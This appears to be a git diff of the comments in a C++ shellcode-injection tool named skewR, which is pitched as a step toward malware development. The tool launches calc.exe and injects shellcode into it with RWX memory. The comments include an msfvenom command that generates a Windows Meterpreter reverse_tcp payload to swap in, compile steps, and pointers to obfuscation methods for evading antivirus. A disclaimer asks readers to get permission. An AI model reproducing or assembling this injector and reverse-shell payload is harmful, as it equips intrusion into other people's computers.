@@ -15,19 +15,21 @@ the potential to be a nasty payload, but right now it's shooting blanks (hence t
 invalid shellcode bellow)
 
 skewR not flag your AV until it includes actual malicious shellcode. If you were to
-run it as is, it will not compromise your computer IN ANY WAY! skewR opens calc.exe, 
-seeks out its PID and injects shellcode to that process with rwx permission since 
-the shellcode below is invalid it will just crash Calculator.Not PERMINATELY either. 
+run it as is, it will not compromise your computer IN ANY WAY! This code is obviously
+not obfuscated so even when you run it with your msfvenom shcode it will set off any
+AV just heads up. You can find great methods right here on github for obfuscation.
+skewR opens calc.exe, seeks out its PID and injects shellcode to that process with rwx 
+permission since the shellcode below is invalid it will just crash Calculator. Not PERMINATELY either. 
 But that's how you know, FOR SURE the injection WORKS! Just swap the shellcode below 
 with your own. Steps on how to do so are at the bottom.
 
  CREDIT WHERE CREDIT'S DO:
  This script was put together after watching mr.Crow's Maldev II video on youtube
- go and check him out at crow.rip and youtube.com!
+ go and check him out at crow.rip, https://www.youtube.com/@crr0ww.
  The only difference between his walkthrough and this script is instead of having to put 
  in a PID for argv[1] this script will open the calculator 
- find it's PID and inject your shellcode.It's the ol' calculator reverse TCP no-
- thing new but it is a neat tool and a great step torwards malware development
+ find it's PID and inject your shellcode. It's the ol' calculator reverse TCP no-
+ thing new but it is a neat tool and a great step torwards malware development.
 
 DONT BE A PIECE OF SH** AND USE THIS AS AMMUNITION TO HURT PEOPLE. I DO NOT
 ENCOURAGE ANY ILLEGAL ACTIVITY. GET PERMISSION OR JUST DO IT TO YOURSELF,
@@ -114,7 +116,10 @@ int main() {
 }
 
 // COMPILE
-// g++ programname.cpp -o programname
+// You need MSYS2 to get gcc and g++ for windows
+// https://www.msys2.org/ dont bother with the youtube videos their TERRIBLE go here:
+// https://www.freecodecamp.org/news/how-to-install-c-and-cpp-compiler-on-windows
+// g++ skewR.cpp -o whateveryouwanttocallit
 
 // SHELLCODE
 // msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<yourip> LPORT=<a port to listen on> EXITFUNC=thread -f c -v=skewR > name.txt
